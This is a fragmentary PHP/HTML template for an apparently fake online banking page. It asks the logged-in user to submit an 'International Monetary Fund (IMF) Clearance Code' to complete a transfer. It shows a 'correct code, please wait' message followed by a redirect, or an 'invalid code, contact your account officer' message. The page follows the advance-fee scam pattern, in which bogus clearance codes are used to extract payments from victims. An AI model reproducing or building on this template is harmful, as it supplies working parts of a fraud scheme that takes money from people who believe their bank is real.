            ...
            <div class="col-md-8">
              <div class="card">
                <div class="card-header card-header-primary">
                  <h4 class="card-title">International Monetary Fund (IMF)</h4>
                  <p class="card-category">Dear <strong style="color:yellow;"><?php echo $_SESSION['hlbank_user_name'];  ?></strong>, Our Banking Transfer Services are guided by laws of United States
                           ...
                           transfer Unit of <?php echo $site_title; ?>.</p>
                </div>
                <div class="card-body">
...
<input type="hidden" value=" <?php echo $_SESSION['hlbank_user_name'];  ?>
	...
	if(isset($_POST['submit'])){
			...
			echo '<meta content="20; url=?v=atc"        http-equiv="refresh" />';
			echo '<h4 style="color:white;
                            		padding: 10px;
                                      ...
                                      border-radius:10px;
                                      font-size:16px;
                                      font-weight:700;">You have entered a Correct IMF Code, PLease Wait a moment</h4>';
		            ...
		            echo '<h4 style="color:white;
                            		padding: 10px;
                                      ...
                                      font-weight:700;
                    		            ...
                    		            ">  The IMF Code you entered is Invalid, Contact Your Account Officer</h4>';
                    ...
                    <div class="row">
                      <div class="col-md-12">
                        <div class="form-group">
                          <label>IMF Clearance Code</label>
                          <div class="form-group">
                            <label class="bmd-label-floating"></label>
                            <textarea class="form-control" rows="5" name="imf" placeholder="Enter IMF Code" required=""></textarea>
                          </div>
                        </div>
                      </div>
                    </div>
...
<input type="hidden" name="saccno" value="<?php echo $_SESSION["saccno"]; ?> "/>		
                    ...
                    <button  id="submitButton" type="submit" name="submit" class="btn btn-primary pull-right">Validate IMF Clearance Code</button>
